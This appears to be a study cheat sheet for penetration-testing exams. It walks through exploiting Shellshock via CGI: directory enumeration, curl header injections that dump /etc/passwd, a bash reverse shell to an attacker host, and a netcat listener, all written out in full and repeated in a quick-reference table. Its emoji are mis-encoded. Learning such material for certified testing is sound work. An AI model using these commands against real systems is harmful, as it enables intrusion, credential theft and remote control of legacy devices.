üß† "Got This, Do That" - Shellshock (CVE-2014-6271) via CGI
Got This ‚ûú Do That
Found a CGI endpoint (e.g., /cgi-bin/access.cgi)
‚û°Ô∏è Use gobuster to enumerate:

bash
Copy
Edit
gobuster dir -u http://<IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
Curl returns 200 OK but no output
‚û°Ô∏è It may be a vulnerable CGI script ‚Äî test with User-Agent header injection:

bash
Copy
Edit
curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<IP>/cgi-bin/access.cgi
‚úÖ If /etc/passwd is dumped ‚Üí Vulnerable to Shellshock

Confirmed vulnerable
‚û°Ô∏è Send a reverse shell payload via header:

bash
Copy
Edit
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<IP>/cgi-bin/access.cgi
üî• Start listener:

bash
Copy
Edit
nc -lvnp <LPORT>
Got a shell
‚û°Ô∏è You‚Äôre probably www-data
‚Üí Enumerate for local privesc, creds, pivot ops

‚ö° Fast Exploit Reference
Step	Command
Dir scan	gobuster dir -u http://<IP>/cgi-bin/ -w ... -x cgi
Check vuln	curl -H 'User-Agent: () { :; }; echo vulnerable' http://<IP>/cgi-bin/foo.cgi
Dump passwd	curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://<IP>/cgi-bin/foo.cgi
Reverse shell	curl -H 'User-Agent: () { :; }; bash -i >& /dev/tcp/LHOST/LPORT 0>&1' http://<IP>/cgi-bin/foo.cgi
Listener	nc -lvnp <LPORT>

üîç Why Shellshock (2014) Is Still in CPTS
Legacy Lives On
Companies still have old-ass CGI scripts running in the wild, especially in:

IoT devices

Embedded systems

Forgotten corners of DMZs

Simple Foothold
It's a one-liner RCE with almost no setup. If you find it, you're in within seconds. Great for exam speedruns.

Foundational Learning
Helps build instinct for:

Header-based payloads

Exploiting server-side scripts

Environment variable manipulation (key in Linux privesc too)

It‚Äôs a "Gimme" on Exams
If you see /cgi-bin/ during CPTS or OSCP? Bet money it's Shellshock. They‚Äôre practically handing you root access with a bow.
